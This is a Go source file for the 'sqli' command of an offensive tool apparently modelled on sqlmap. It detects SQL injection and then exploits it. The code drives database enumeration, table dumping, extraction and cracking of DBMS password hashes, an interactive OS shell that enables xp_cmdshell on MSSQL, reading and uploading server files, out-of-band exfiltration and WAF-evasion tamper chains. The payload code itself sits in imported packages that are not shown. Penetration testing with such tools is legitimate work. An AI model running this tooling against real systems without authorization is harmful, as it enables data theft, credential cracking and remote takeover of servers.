package main

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/0xseif-code/vexor/internal/httpclient"
	"github.com/0xseif-code/vexor/internal/sqli"
	"github.com/0xseif-code/vexor/internal/sqli/common"
	"github.com/0xseif-code/vexor/internal/sqli/enumeration"
	"github.com/0xseif-code/vexor/internal/sqli/takeover"
	"github.com/0xseif-code/vexor/internal/sqli/tamper"
	"github.com/0xseif-code/vexor/internal/sqli/techniques"
	"github.com/0xseif-code/vexor/internal/sqli/ui"
	"github.com/0xseif-code/vexor/internal/sqli/waf"
	"github.com/spf13/cobra"
)

// normalizeDBMS maps common user inputs onto the engine's canonical names.
func normalizeDBMS(s string) string {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "mysql", "mariadb", "mysql server":
		return "mysql"
	case "postgres", "postgresql", "pg", "pgsql":
		return "postgres"
	case "mssql", "ms-sql", "sql server", "microsoft sql server":
		return "mssql"
	case "oracle", "ora":
		return "oracle"
	case "sqlite", "sqlite3":
		return "sqlite"
	}
	return strings.ToLower(strings.TrimSpace(s))
}

// techniqueAliases maps sqlmap-style single letters and common shorthand onto
// the engine's canonical technique names (see internal/sqli/techniques).
var techniqueAliases = map[string]string{
	"b": techniques.TechBoolean,
	"e": techniques.TechError,
	"u": techniques.TechUnion,
	"s": techniques.TechStacked,
	"t": techniques.TechTime,
	"i": techniques.TechInline,
	"q": techniques.TechOOB,
	"o": techniques.TechOOB,
}

var techniqueByName = map[string]string{
	"boolean":       techniques.TechBoolean,
	"boolean-based": techniques.TechBoolean,
	"error":         techniques.TechError,
	"error-based":   techniques.TechError,
	"union":         techniques.TechUnion,
	"union-query":   techniques.TechUnion,
	"stacked":       techniques.TechStacked,
	"stacked-query": techniques.TechStacked,
	"time":          techniques.TechTime,
	"time-based":    techniques.TechTime,
	"inline":        techniques.TechInline,
	"oob":           techniques.TechOOB,
	"out-of-band":   techniques.TechOOB,
	"outofband":     techniques.TechOOB,
}

// parseTechniques turns a --technique spec (letters like "BEUT" or a comma
// separated list of names) into canonical technique names. An empty or "*"
// input means "all" and returns nil so the engine keeps its defaults.
func parseTechniques(s string) ([]string, error) {
	var out []string
	seen := map[string]bool{}
	for _, part := range strings.Split(s, ",") {
		tok := strings.ToLower(strings.TrimSpace(part))
		if tok == "" {
			continue
		}
		if tok == "*" {
			return nil, nil
		}
		// A bare run of letters like "BEUT" selects each letter's technique.
		if !strings.ContainsAny(tok, " -") && !tokMatchesName(tok) {
			for _, ch := range tok {
				c := strings.ToLower(string(ch))
				if mapped, ok := techniqueAliases[c]; ok {
					if !seen[mapped] {
						seen[mapped] = true
						out = append(out, mapped)
					}
				} else {
					return nil, fmt.Errorf("unknown technique code %q in --technique %q (use BEUSTIQ letters or names)", string(ch), s)
				}
			}
			continue
		}
		if mapped, ok := techniqueByName[tok]; ok {
			if !seen[mapped] {
				seen[mapped] = true
				out = append(out, mapped)
			}
			continue
		}
		return nil, fmt.Errorf("unknown technique %q in --technique (use BEUSTIQ letters or names like boolean, error, union)", tok)
	}
	return out, nil
}

func tokMatchesName(tok string) bool {
	_, ok := techniqueByName[tok]
	return ok
}

func newSQLiCmd() *cobra.Command {
	o := &sqliOptions{}
	cmd := &cobra.Command{
		Use:   "sqli",
		Short: "Detect and exploit SQL injection",
		Long: `Detect SQL injection across all request parameters (or a single
parameter with -p) using boolean, error, union, stack, inline, time, and
out-of-band techniques. Confirmed findings stream out immediately and, when
the matching exploitation flag is given, the first confirmed injection
point is used for enumeration (--dbs/--tables/--columns/--dump) or
full takeover (--os-shell/--read-file/--write-file).

--tamper and --auto-tamper validate a tamper chain and print the tampered
variant of each confirmed payload for manual replay. The detection engine
itself sends stock payloads; see --tamper for details.`,
		Args: cobra.NoArgs,
		RunE: func(cmd *cobra.Command, args []string) error {
			return runSQLi(cmd.Context(), o)
		},
	}

	f := cmd.Flags()
	f.StringVarP(&o.url, "url", "u", "", "target URL, e.g. https://example.com/page?id=1")
	f.StringVarP(&o.request, "request", "r", "", "Burp-style raw HTTP request file")
	f.StringVarP(&o.param, "param", "p", "", "only test this parameter name")
	f.StringVar(&o.technique, "technique", "", "detection technique(s) to use: BEUSTIQ letters or names, e.g. E, BEUT, error, boolean (empty = all)")
	f.StringVar(&o.dbms, "dbms", "", "force a DBMS: mysql, postgres, mssql, oracle, sqlite")
	f.IntVar(&o.level, "level", 1, "intensity level for parameters to test (1-5)")
	f.IntVar(&o.risk, "risk", 1, "risk level for payloads to try (1-3)")
	f.IntVar(&o.threads, "threads", 10, "number of concurrent workers while scanning")
	f.DurationVar(&o.timeout, "timeout", 8*time.Second, "per-request timeout, e.g. 8s or 500ms")
	f.DurationVar(&o.delay, "delay", 0, "delay between requests, e.g. 500ms or 2s")
	f.IntVar(&o.retries, "retries", 1, "number of retries per failed request")
	f.BoolVar(&o.fast, "fast", false, "shortcut: level=1 risk=1 technique=E,U threads=15")
	f.StringSliceVar(&o.tamper, "tamper", nil, "tamper scripts to validate and apply to output payloads, e.g. space2comment,randomcase")
	f.BoolVar(&o.autoTamper, "auto-tamper", false, "fingerprint the WAF (if any) and use its suggested tamper chain")
	f.StringVar(&o.oobDomain, "oob-domain", "", "domain for out-of-band (DNS/HTTP) exfiltration payloads")

	f.BoolVar(&o.dbs, "dbs", false, "enumerate databases after confirmation")
	f.BoolVar(&o.tables, "tables", false, "enumerate tables after confirmation")
	f.BoolVar(&o.columns, "columns", false, "enumerate columns after confirmation")
	f.BoolVar(&o.dump, "dump", false, "dump a table's contents after confirmation")
	f.StringVarP(&o.database, "database", "D", "", "database name (-D) for --tables/--columns/--dump")
	f.StringVarP(&o.table, "table", "T", "", "table name (-T) for --columns/--dump")
	f.StringSliceVarP(&o.cols, "column", "C", nil, "specific column names to dump, repeatable")

	f.BoolVar(&o.crack, "crack", false, "automatically crack password hashes found in the dump")
	f.BoolVar(&o.noCrack, "no-crack", false, "never crack password hashes found in the dump")
	f.BoolVar(&o.passwords, "passwords", false, "enumerate DBMS users and their password hashes after confirmation")

	f.BoolVar(&o.osShell, "os-shell", false, "spawn an interactive OS shell via the injection point")
	f.StringVar(&o.readFile, "read-file", "", "read a file from the database server")
	f.StringVar(&o.writeFile, "write-file", "", "write a local file to the database server")
	f.StringVar(&o.fileDest, "file-dest", "", "remote destination path for --write-file (default: basename)")

	return cmd
}

type sqliOptions struct {
	url        string
	request    string
	param      string
	technique  string
	dbms       string
	level      int
	risk       int
	threads    int
	timeout    time.Duration
	delay      time.Duration
	retries    int
	fast       bool
	tamper     []string
	autoTamper bool
	oobDomain  string

	dbs     bool
	tables  bool
	columns bool
	dump    bool

	database string
	table    string
	cols     []string

	crack     bool
	noCrack   bool
	passwords bool

	osShell   bool
	readFile  string
	writeFile string
	fileDest  string
}

func (o *sqliOptions) exploitRequested() bool {
	return o.dbs || o.tables || o.columns || o.dump || o.passwords || o.osShell || o.readFile != "" || o.writeFile != ""
}

func runSQLi(ctx context.Context, o *sqliOptions) error {
	if o.url == "" && o.request == "" {
		return fmt.Errorf("no target: set -u or -r")
	}
	if o.request != "" {
		if o.url != "" {
			logWarn("-u ignored because -r takes precedence")
		}
		if _, err := os.Stat(o.request); err != nil {
			return fmt.Errorf("raw request file: %w", err)
		}
	}
	if o.tables && o.database == "" {
		logInfo("--tables without -D: enumerating tables in the current database")
	}
	if (o.columns || o.dump) && o.table == "" {
		return fmt.Errorf("--columns/--dump require -T (table name)")
	}

	client, err := newHTTPClient()
	if err != nil {
		return err
	}
	pub, err := newPublisher(app.format, app.output)
	if err != nil {
		return err
	}
	defer pub.Close()

	// Resolve the tamper chain before scanning so bad names fail fast.
	chain, err := resolveTamperChain(ctx, client, o)
	if err != nil {
		return err
	}

	// Propagate --batch to the interactive prompt engine before any scan or
	// enumeration work begins so no prompt ever blocks a scripted run.
	ui.SetBatch(app.batch)

	cfg := sqli.Config{
		URL:            o.url,
		RawRequestFile: o.request,
		TLS:            tlsFromRawRequest(o.request),
		Headers:        parsedHeaders(),
		TestParameter:  o.param,
		Level:          o.level,
		Risk:           o.risk,
		ForceDBMS:      normalizeDBMS(o.dbms),
		OOBDomain:      o.oobDomain,
		Threads:        o.threads,
		Timeout:        o.timeout,
		Delay:          o.delay,
		Retries:        o.retries,
		Proxy:          app.proxy,
		Progress:       progressWriter(),
		Batch:          app.batch,
	}

	if o.fast {
		cfg.Level = 1
		cfg.Risk = 1
		cfg.Techniques = []string{techniques.TechError, techniques.TechUnion}
		cfg.Threads = 15
		cfg.Fast = true
	} else if o.technique != "" {
		techs, err := parseTechniques(o.technique)
		if err != nil {
			return err
		}
		cfg.Techniques = techs
	}

	target := o.url
	if o.request != "" {
		target = o.request + " (raw request)"
	}
	logStep("starting SQL injection scan on %s (dbms=%s level=%d risk=%d threads=%d)", target, keywordOr(o.dbms, "auto"), cfg.Level, cfg.Risk, cfg.Threads)

	scanStart := time.Now()
	det := sqli.New(cfg, client)
	detCh, errCh := det.Run(ctx)
	meter := det.Meter()

	exploit := o.exploitRequested()
	var first *sqli.Detection
	var firstError *sqli.Detection

	header := []string{"point", "technique", "dbms", "confidence", "payload", "evidence"}
	findings := 0
	for d := range detCh {
		findings++
		if exploit && first == nil {
			copy := d
			first = &copy
		}
		if exploit && firstError == nil && strings.Contains(strings.ToLower(d.Technique), "error") {
			copy := d
			firstError = &copy
		}

		point := pointLabel(d.Point)
		pub.Publish(
			fmt.Sprintf("%s technique=%s dbms=%s confidence=%d", point, d.Technique, d.DBMS, d.Confidence),
			struct {
				Point      string `json:"point"`
				Technique  string `json:"technique"`
				DBMS       string `json:"dbms"`
				Confidence int    `json:"confidence"`
				Payload    string `json:"payload"`
				Evidence   string `json:"evidence"`
			}{Point: point, Technique: d.Technique, DBMS: d.DBMS, Confidence: d.Confidence, Payload: d.Payload, Evidence: d.Evidence},
			header,
			[]string{point, d.Technique, d.DBMS, fmt.Sprint(d.Confidence), csvEscape(d.Payload), csvEscape(d.Evidence)},
		)
		if chain != nil && chain.Len() > 0 {
			logInfo("point %s tampered payload: %s", point, chain.Apply(d.Payload))
		}
	}

	// Drain remaining errors (the detector's run already logs progress).
	scanErrs := 0
	var lastScanErr error
	for err := range errCh {
		scanErrs++
		lastScanErr = err
		logWarn("scan: %v", err)
	}

	st := det.Stats()
	if st.Findings == 0 && scanErrs > 0 {
		return fmt.Errorf("no findings: %w", lastScanErr)
	}
	scanRate := 0.0
	if st.Elapsed.Seconds() > 0 {
		scanRate = float64(st.Requests) / st.Elapsed.Seconds()
	}
	logOK("scan complete: %d findings, %d requests, %d errors in %s (%.1f req/s)", st.Findings, st.Requests, st.Errors, humanDur(st.Elapsed), scanRate)
	if st.DBMS != "" {
		logInfo("fingerprinted DBMS: %s", st.DBMS)
	}

	phases := []phaseStat{{label: "detect", start: scanStart}}

	if exploit {
		if first == nil {
			return fmt.Errorf("no confirmed injection point found; cannot run %s", exploitModes(o))
		}
		// Prefer an error-based finding for exploitation when one exists: its
		// error channel is the fastest, most decisive extraction path on
		// verbose targets, and the first confirmed point may only be a weak
		// boolean oracle.
		chosen := first
		if firstError != nil {
			chosen = firstError
		}
		logOK("first confirmed injection point: %s (%s)", pointLabel(chosen.Point), chosen.Technique)
		if err := runSQLiExploitation(ctx, client, pub, *chosen, meter, o, &phases); err != nil {
			return err
		}
	}

	emitPhaseSummary(meter, phases)
	return nil
}

// resolveTamperChain validates --tamper / --auto-tamper. The chain is used to
// render tampered variants of confirmed payloads; the detection engine itself
// has no mid-scan tamper hook, so the variant strings are labelled for manual
// verification rather than being re-sent by the engine.
func resolveTamperChain(ctx context.Context, client *httpclient.Client, o *sqliOptions) (*tamper.Chain, error) {
	var names []string
	if o.autoTamper {
		wafName := ""
		if o.url != "" {
			w, err := waf.New(client).Detect(ctx, o.url)
			switch {
			case err != nil:
				logWarn("WAF detection failed: %v", err)
			case w != nil:
				wafName = w.Name
				logWarn("detected %s WAF (confidence %d%%)", w.Name, w.Confidence)
			default:
				logInfo("no WAF fingerprint matched")
			}
		} else {
			logInfo("--auto-tamper needs -u for WAF fingerprinting; using the default chain")
		}
		if wafName == "" {
			names = tamper.SuggestForWAF("")
		} else {
			names = tamper.SuggestForWAF(wafName)
		}
		names = append(o.tamper, names...)
	} else {
		names = o.tamper
	}
	if len(names) == 0 {
		return nil, nil
	}
	chain, err := tamper.NewChain(names)
	if err != nil {
		return nil, err
	}
	logInfo("tamper chain: %s", strings.Join(chain.Names(), ", "))
	return chain, nil
}

// phaseStat carries the start boundary of one run phase (detect / enum /
// dump). The phases are fed to emitPhaseSummary to print a compact,
// real-time instrumentation line at the end of every run.
type phaseStat struct {
	label string
	start time.Time
}

// emitPhaseSummary prints "[+] done | ..." to stderr with the cumulative
// request count, elapsed time, request rate, and a per-phase time breakdown
// for the phases whose start snapshots were captured earlier. The phase
// durations are computed from the gaps between consecutive starts, which also
// gives each phase its request delta when summed.
func emitPhaseSummary(meter *common.Meter, phases []phaseStat) {
	if len(phases) == 0 {
		return
	}
	first := phases[0]
	elapsed := time.Since(first.start)
	total := meter.Requests.Load()
	rate := 0.0
	if elapsed.Seconds() > 0 {
		rate = float64(total) / elapsed.Seconds()
	}
	var b strings.Builder
	b.WriteString("[+] done | ")
	fmt.Fprintf(&b, "requests=%d | elapsed=%s | rate=%.1f req/s", total, humanDur(elapsed), rate)
	b.WriteString(" | phase(")
	for i, p := range phases {
		var elap time.Duration
		if i == len(phases)-1 {
			elap = time.Since(p.start)
		} else {
			elap = phases[i+1].start.Sub(p.start)
		}
		if i > 0 {
			b.WriteString(" ")
		}
		fmt.Fprintf(&b, "%s=%.1fs", p.label, elap.Seconds())
	}
	b.WriteString(")")
	fmt.Fprintln(progressWriter(), b.String())
}

// crackPolicy maps the --crack / --no-crack CLI switches onto the enumeration
// package's crack policy. With neither flag the prompt policy is used, and the
// batch/non-TTY default (via ui.SetBatch) resolves to "no" for scripted runs.
func crackPolicy(o *sqliOptions) enumeration.CrackPolicy {
	switch {
	case o.noCrack:
		return enumeration.CrackNever
	case o.crack:
		return enumeration.CrackForce
	}
	return enumeration.CrackPrompt
}

func runSQLiExploitation(ctx context.Context, client *httpclient.Client, pub *Publisher, det sqli.Detection, meter *common.Meter, o *sqliOptions, phases *[]phaseStat) error {
	opts := enumeration.Options{
		Concurrency: enumeration.DefaultConcurrency,
		Progress:    progressWriter(),
		Meter:       meter,
		Delay:       o.delay,
		Timeout:     o.timeout,
		Crack:       crackPolicy(o),
	}
	if strings.Contains(strings.ToLower(det.Technique), "error") {
		// Error-channel reads are stateless per expression and calibration is
		// mutex-guarded, so parallel workers are safe; a moderate fan-out
		// speeds up multi-cell scans without the request flood of the blind
		// default.
		opts.Concurrency = 8
	}
	enum := enumeration.NewEnumeratorOpts(det, client, opts)

	// enumStart captures the boundary where enumeration begins so the final
	// summary can report the enum phase duration on the shared meter.
	enumStart := time.Now()
	*phases = append(*phases, phaseStat{label: "enum", start: enumStart})

	if o.dbs {
		logStep("enumerating databases")
		dbs, err := enum.ListDatabases(ctx)
		if err != nil {
			return fmt.Errorf("list databases: %w", err)
		}
		for _, db := range dbs {
			pub.Publish(db, struct {
				Database string `json:"database"`
			}{db}, []string{"database"}, []string{db})
		}
		logOK("%d databases", len(dbs))
	}

	if o.tables {
		logStep("enumerating tables in %s", keywordOr(o.database, "current database"))
		tables, err := enum.ListTables(ctx, o.database)
		if err != nil {
			return fmt.Errorf("list tables: %w", err)
		}
		for _, t := range tables {
			pub.Publish(t, struct {
				Table string `json:"table"`
			}{t}, []string{"table"}, []string{t})
		}
		logOK("%d tables", len(tables))
	}

	if o.columns {
		logStep("enumerating columns of %s.%s", keywordOr(o.database, "current"), o.table)
		cols, err := enum.ListColumns(ctx, o.database, o.table)
		if err != nil {
			return fmt.Errorf("list columns: %w", err)
		}
		header := []string{"column", "type"}
		kept := 0
		for _, c := range cols {
			if len(o.cols) > 0 && !containsStr(o.cols, c.Name) {
				continue
			}
			kept++
			pub.Publish(c.Name, struct {
				Column string `json:"column"`
				Type   string `json:"type"`
			}{c.Name, c.Type}, header, []string{c.Name, c.Type})
		}
		logOK("%d columns", kept)
	}

	if o.passwords {
		logStep("enumerating password hashes for DBMS users")
		creds, err := enum.PasswordHashes(ctx)
		if err != nil {
			return fmt.Errorf("password hashes: %w", err)
		}
		header := []string{"user", "hash"}
		for _, c := range creds {
			pub.Publish(c.User+"\t"+c.Hash, struct {
				User string `json:"user"`
				Hash string `json:"hash"`
			}{c.User, c.Hash}, header, []string{c.User, c.Hash})
		}
		logOK("%d password hash(es)", len(creds))

		if !o.noCrack {
			cracked, err := enum.CrackCredentials(ctx, creds)
			if err != nil {
				logWarn("hash cracking: %v", err)
			}
			for _, c := range creds {
				if pw, ok := cracked[c.Hash]; ok {
					fmt.Fprintf(progressWriter(), "%s | %s (%s)\n", c.User, c.Hash, pw)
				}
			}
		}
	}

	if o.dump {
		dumpStart := time.Now()
		*phases = append(*phases, phaseStat{label: "dump", start: dumpStart})
		logStep("dumping %s.%s", keywordOr(o.database, "current"), o.table)
		res, err := enum.Dump(ctx, enumeration.DumpOptions{
			Database: o.database,
			Table:    o.table,
			Columns:  o.cols,
			Format:   string(app.format),
		})
		if err != nil {
			return fmt.Errorf("dump table: %w", err)
		}
		if res.Table != o.table || (o.database != "" && res.Database != o.database) {
			logInfo("table resolved to %s.%s (requested %s.%s)", res.Database, res.Table, keywordOr(o.database, "?"), o.table)
		}
		if len(res.Cols) == 0 {
			return fmt.Errorf("dump table %s.%s: no columns resolved and no rows produced", res.Database, res.Table)
		}
		if app.format == string(FormatPlain) {
			pub.Publish(strings.Join(res.Cols, "\t"), nil, nil, nil)
		}
		pubHeader := res.Cols
		for _, row := range res.Rows {
			plain := strings.Join(row, "\t")
			pub.Publish(plain, row, pubHeader, row)
		}
		logOK("dumped %d rows from %s.%s (%d columns)", len(res.Rows), res.Database, res.Table, len(res.Cols))
	}

	if o.osShell {
		if det.DBMS == "mssql" {
			logInfo("enabling xp_cmdshell on MSSQL target (may require privileges)")
		}
		shell := takeover.NewShell(det, client)
		if !shell.Supported() {
			return fmt.Errorf("--os-shell not supported for DBMS %q", det.DBMS)
		}
		logStep("interactive OS shell on %s; type 'exit' to quit", det.DBMS)
		return shell.Interactive(ctx)
	}

	if o.readFile != "" {
		fs := takeover.NewFileSystem(det, client)
		if !fs.Supported() {
			return fmt.Errorf("--read-file not supported for DBMS %q", det.DBMS)
		}
		data, err := fs.ReadFile(ctx, o.readFile)
		if err != nil {
			return fmt.Errorf("read file: %w", err)
		}
		pub.WriteRaw(data)
		if len(data) > 0 && data[len(data)-1] != '\n' {
			pub.WriteRaw([]byte("\n"))
		}
		logOK("read %d bytes from %s", len(data), o.readFile)
	}

	if o.writeFile != "" {
		dest := o.fileDest
		if dest == "" {
			dest = filepath.Base(o.writeFile)
		}
		fs := takeover.NewFileSystem(det, client)
		if !fs.Supported() {
			return fmt.Errorf("--write-file not supported for DBMS %q", det.DBMS)
		}
		if err := fs.UploadFile(ctx, o.writeFile, dest); err != nil {
			return fmt.Errorf("write file: %w", err)
		}
		logOK("uploaded %s -> %s", o.writeFile, dest)
	}

	return nil
}

func pointLabel(p sqli.InjectionPoint) string {
	if p.Name == "" {
		return p.Location + "/" + p.Type
	}
	return p.Location + "/" + p.Type + "/" + p.Name
}

func tlsFromRawRequest(path string) bool {
	if path == "" {
		return false
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return false
	}
	line := string(bytes.SplitN(data, []byte("\n"), 2)[0])
	return strings.Contains(line, "https")
}

func containsStr(hay []string, needle string) bool {
	for _, s := range hay {
		if s == needle {
			return true
		}
	}
	return false
}

func keywordOr(s, fallback string) string {
	if s == "" {
		return fallback
	}
	return s
}

func exploitModes(o *sqliOptions) string {
	var modes []string
	if o.dbs {
		modes = append(modes, "--dbs")
	}
	if o.tables {
		modes = append(modes, "--tables")
	}
	if o.columns {
		modes = append(modes, "--columns")
	}
	if o.dump {
		modes = append(modes, "--dump")
	}
	if o.passwords {
		modes = append(modes, "--passwords")
	}
	if o.osShell {
		modes = append(modes, "--os-shell")
	}
	if o.readFile != "" {
		modes = append(modes, "--read-file")
	}
	if o.writeFile != "" {
		modes = append(modes, "--write-file")
	}
	return strings.Join(modes, ", ")
}
